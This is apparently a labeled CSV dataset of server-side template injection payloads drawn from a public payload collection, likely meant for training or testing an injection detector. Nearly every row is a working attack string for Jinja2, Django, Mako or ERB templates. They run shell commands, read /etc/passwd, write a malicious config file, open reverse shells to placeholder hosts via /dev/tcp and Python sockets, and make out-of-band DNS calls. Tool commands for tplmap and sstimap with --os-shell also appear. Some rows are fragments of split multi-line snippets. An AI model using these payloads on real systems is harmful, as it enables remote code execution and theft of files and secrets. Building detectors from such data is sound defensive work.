payload,label,source
"getattr("""", ""x"" + __include__(""os"").popen(""id"").read()) # Error-Based RCE",ssti,payloads_all_the_things
"1 / (__include__(""os"").popen(""id"")._proc.wait() == 0) # Boolean-Based RCE",ssti,payloads_all_the_things
"__include__(""os"").popen(""id && sleep 5"").read() # Time-Based RCE",ssti,payloads_all_the_things
{% csrf_token %} # Causes error with Jinja2,ssti,payloads_all_the_things
{{ 7*7 }}  # Error with Django Templates,ssti,payloads_all_the_things
ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r,ssti,payloads_all_the_things
{{ '<script>alert(3)</script>' }},ssti,payloads_all_the_things
{{ '<script>alert(3)</script>' | safe }},ssti,payloads_all_the_things
{% debug %},ssti,payloads_all_the_things
{{ messages.storages.0.signer.key }},ssti,payloads_all_the_things
{% include 'admin/base.html' %},ssti,payloads_all_the_things
{% load log %}{% get_admin_log 10 as log %}{% for e in log %},ssti,payloads_all_the_things
{{e.user.get_username}} : {{e.user.password}}{% endfor %},ssti,payloads_all_the_things
{% get_admin_log 10 as admin_log for_user user %},ssti,payloads_all_the_things
{{4*4}}[[5*5]],ssti,payloads_all_the_things
{{7*'7'}} would result in 7777777,ssti,payloads_all_the_things
{{config.items()}},ssti,payloads_all_the_things
"{% extends ""layout.html"" %}",ssti,payloads_all_the_things
{% block body %},ssti,payloads_all_the_things
<ul>,ssti,payloads_all_the_things
{% for user in users %},ssti,payloads_all_the_things
"<li><a href=""{{ user.url }}"">{{ user.username }}</a></li>",ssti,payloads_all_the_things
{% endfor %},ssti,payloads_all_the_things
</ul>,ssti,payloads_all_the_things
{% endblock %},ssti,payloads_all_the_things
<pre>{% debug %}</pre>,ssti,payloads_all_the_things
{{ [].class.base.subclasses() }},ssti,payloads_all_the_things
{{''.class.mro()[1].subclasses()}},ssti,payloads_all_the_things
{{ ''.__class__.__mro__[2].__subclasses__() }},ssti,payloads_all_the_things
{{ self.__init__.__globals__.__builtins__ }},ssti,payloads_all_the_things
"{% for key, value in config.iteritems() %}",ssti,payloads_all_the_things
<dt>{{ key|e }}</dt>,ssti,payloads_all_the_things
<dd>{{ value|e }}</dd>,ssti,payloads_all_the_things
# ''.__class__.__mro__[2].__subclasses__()[40] = File class,ssti,payloads_all_the_things
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }},ssti,payloads_all_the_things
"{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/tmp/flag"").read() }}",ssti,payloads_all_the_things
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398,ssti,payloads_all_the_things
"{{ get_flashed_messages.__globals__.__builtins__.open(""/etc/passwd"").read() }}",ssti,payloads_all_the_things
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}",ssti,payloads_all_the_things
nc -lnvp 8000,ssti,payloads_all_the_things
"x.__init__.__builtins__.exec(""from flask import current_app, after_this_request",ssti,payloads_all_the_things
@after_this_request,ssti,payloads_all_the_things
"def hook(*args, **kwargs):",ssti,payloads_all_the_things
from flask import make_response,ssti,payloads_all_the_things
r = make_response('Powned'),ssti,payloads_all_the_things
return r,ssti,payloads_all_the_things
""")",ssti,payloads_all_the_things
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }},ssti,payloads_all_the_things
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }},ssti,payloads_all_the_things
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }},ssti,payloads_all_the_things
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }},ssti,payloads_all_the_things
{{ cycler.__init__.__globals__.os.popen('id').read() }},ssti,payloads_all_the_things
{{ joiner.__init__.__globals__.os.popen('id').read() }},ssti,payloads_all_the_things
{{ namespace.__init__.__globals__.os.popen('id').read() }},ssti,payloads_all_the_things
"{{ cycler.__init__.__globals__.__builtins__.getattr("""", ""x"" + cycler.__init__.__globals__.os.popen('id').read()) }} # Error-Based",ssti,payloads_all_the_things
"{{ 1 / (cycler.__init__.__globals__.os.popen(""id"")._proc.wait() == 0) }} # Boolean-Based",ssti,payloads_all_the_things
"{{ lipsum.__globals__[""os""].popen('id').read() }}",ssti,payloads_all_the_things
"{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",ssti,payloads_all_the_things
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},ssti,payloads_all_the_things
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""ip\"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/cat\"", \""flag.txt\""]);'"").read().zfill(417)}}{%endif%}{% endfor %}",ssti,payloads_all_the_things
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",ssti,payloads_all_the_things
# evil config,ssti,payloads_all_the_things
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}",ssti,payloads_all_the_things
# load the evil config,ssti,payloads_all_the_things
{{ config.from_pyfile('/tmp/evilconfig.cfg') }},ssti,payloads_all_the_things
# connect to evil host,ssti,payloads_all_the_things
"{{ config['RUNCMD']('/bin/bash -c ""/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1""',shell=True) }}",ssti,payloads_all_the_things
{{self.__init__.__globals__.__str__()[1786:1788]}},ssti,payloads_all_the_things
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}},ssti,payloads_all_the_things
request.__class__,ssti,payloads_all_the_things
"request[""__class__""]",ssti,payloads_all_the_things
"http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_",ssti,payloads_all_the_things
"{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",ssti,payloads_all_the_things
"{{request|attr([""_""*2,""class"",""_""*2]|join)}}",ssti,payloads_all_the_things
"{{request|attr([""__"",""class"",""__""]|join)}}",ssti,payloads_all_the_things
"{{request|attr(""__class__"")}}",ssti,payloads_all_the_things
{{request.__class__}},ssti,payloads_all_the_things
"http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_",ssti,payloads_all_the_things
or,ssti,payloads_all_the_things
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_,ssti,payloads_all_the_things
|join,ssti,payloads_all_the_things
"http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_",ssti,payloads_all_the_things
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},ssti,payloads_all_the_things
{{7*'7'}},ssti,payloads_all_the_things
{{os.system('whoami')}},ssti,payloads_all_the_things
{%import os%}{{os.system('nslookup oastify.com')}},ssti,payloads_all_the_things
x=os.popen('id').read(),ssti,payloads_all_the_things
%>,ssti,payloads_all_the_things
${x},ssti,payloads_all_the_things
"${self.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.cache.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
${self.__init__.__globals__['util'].os.system('id')},ssti,payloads_all_the_things
"${self.template.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.filters.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.runtime.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.runtime.exceptions.util.os.system(""id"")}",ssti,payloads_all_the_things
${self.template.__init__.__globals__['os'].system('id')},ssti,payloads_all_the_things
"${self.module.cache.util.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.runtime.util.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template._mmarker.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template.module.cache.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.cache.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template._mmarker.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.attr._NSAttr__parent.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template.module.filters.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template.module.runtime.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.filters.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.runtime.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template.module.runtime.exceptions.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.attr._NSAttr__parent.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.context._with_template.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.runtime.exceptions.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template.module.cache.util.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.context._with_template.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.cache.util.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template.module.runtime.util.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.runtime.util.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.runtime.exceptions.util.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template._mmarker.module.cache.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template.module.cache.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
"${self.attr._NSAttr__parent.template.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template._mmarker.module.filters.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template._mmarker.module.runtime.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template._mmarker.module.runtime.exceptions.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template.module.filters.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template.module.runtime.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
"${self.attr._NSAttr__parent.template.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.context._with_template._mmarker.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template.module.runtime.exceptions.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.context._with_template.module.cache.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.module.runtime.exceptions.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
"${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.context._with_template._mmarker.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.context._with_template.module.filters.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.context._with_template.module.runtime.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
"${self.context._with_template.module.runtime.exceptions.util.os.system(""id"")}",ssti,payloads_all_the_things
"${self.template.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",ssti,payloads_all_the_things
">>> print(Template(""${self.module.cache.util.os}"").render())",ssti,payloads_all_the_things
<module 'os' from '/usr/local/lib/python3.10/os.py'>,ssti,payloads_all_the_things
"${str().join(chr(i)for(i)in[105,100])}",ssti,payloads_all_the_things
"${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}",ssti,payloads_all_the_things
"<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}",ssti,payloads_all_the_things
- An efficient SSTI + CSTI scanner which utilizes novel polyglots,ssti,payloads_all_the_things
"tinja url -u ""http://example.com/?name=Kirlia"" -H ""Authentication: Bearer ey...""",ssti,payloads_all_the_things
"tinja url -u ""http://example.com/"" -d ""username=Kirlia""  -c ""PHPSESSID=ABC123...""",ssti,payloads_all_the_things
- Server-Side Template Injection and Code Injection Detection and Exploitation Tool,ssti,payloads_all_the_things
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell,ssti,payloads_all_the_things
"python2.7 ./tplmap.py -u ""http://192.168.56.101:3000/ti?user=*&comment=supercomment&link""",ssti,payloads_all_the_things
"python2.7 ./tplmap.py -u ""http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link"" --level 5 -e jade",ssti,payloads_all_the_things
python3 ./sstimap.py -u 'https://example.com/page?name=John' -s,ssti,payloads_all_the_things
python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade,ssti,payloads_all_the_things
python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk',ssti,payloads_all_the_things
"Rendered, Time-Based:",ssti,payloads_all_the_things
"${{<%[%'""}}%\.",ssti,payloads_all_the_things
{{ ... }},ssti,payloads_all_the_things
${ ... },ssti,payloads_all_the_things
#{ ... },ssti,payloads_all_the_things
<%= ... %>,ssti,payloads_all_the_things
{ ... },ssti,payloads_all_the_things
{{= ... }},ssti,payloads_all_the_things
{= ... },ssti,payloads_all_the_things
\n= ... \n,ssti,payloads_all_the_things
*{ ... },ssti,payloads_all_the_things
@{ ... },ssti,payloads_all_the_things
@( ... ),ssti,payloads_all_the_things
7 * 7,ssti,payloads_all_the_things
(1/0).zxy.zxy,ssti,payloads_all_the_things
(3*4/2),ssti,payloads_all_the_things
3*)2(/4,ssti,payloads_all_the_things
((7*8)/(2*4)),ssti,payloads_all_the_things
7)(*)8)(2/(*4,ssti,payloads_all_the_things
`{{7*7}}` for Jinja2 (Python).,ssti,payloads_all_the_things
#{7*7},ssti,payloads_all_the_things
`#{7*7}` for Thymeleaf (Java).,ssti,payloads_all_the_things
"**Python**: Django, Jinja2, Mako, ...",ssti,payloads_all_the_things
"**Java**: Freemarker, Jinjava, Velocity, ...",ssti,payloads_all_the_things
"**Ruby**: ERB, Slim, ...",ssti,payloads_all_the_things
%x('id') # Rendered RCE,ssti,payloads_all_the_things
"File.read(""Y:/A:/""+%x('id')) # Error-Based RCE",ssti,payloads_all_the_things
"1/(system(""id"")&&1||0) # Boolean-Based RCE",ssti,payloads_all_the_things
"system(""id && sleep 5"") # Time-Based RCE",ssti,payloads_all_the_things
#{ 7 * 7 },ssti,payloads_all_the_things
<%= File.open('/etc/passwd').read %>,ssti,payloads_all_the_things
<%= Dir.entries('/') %>,ssti,payloads_all_the_things
<%=(`nslookup oastify.com`)%>,ssti,payloads_all_the_things
<%= system('cat /etc/passwd') %>,ssti,payloads_all_the_things
<%= `ls /` %>,ssti,payloads_all_the_things
<%= IO.popen('ls /').readlines()  %>,ssti,payloads_all_the_things
"<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>",ssti,payloads_all_the_things
"<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>",ssti,payloads_all_the_things
#{ %x|env| },ssti,payloads_all_the_things
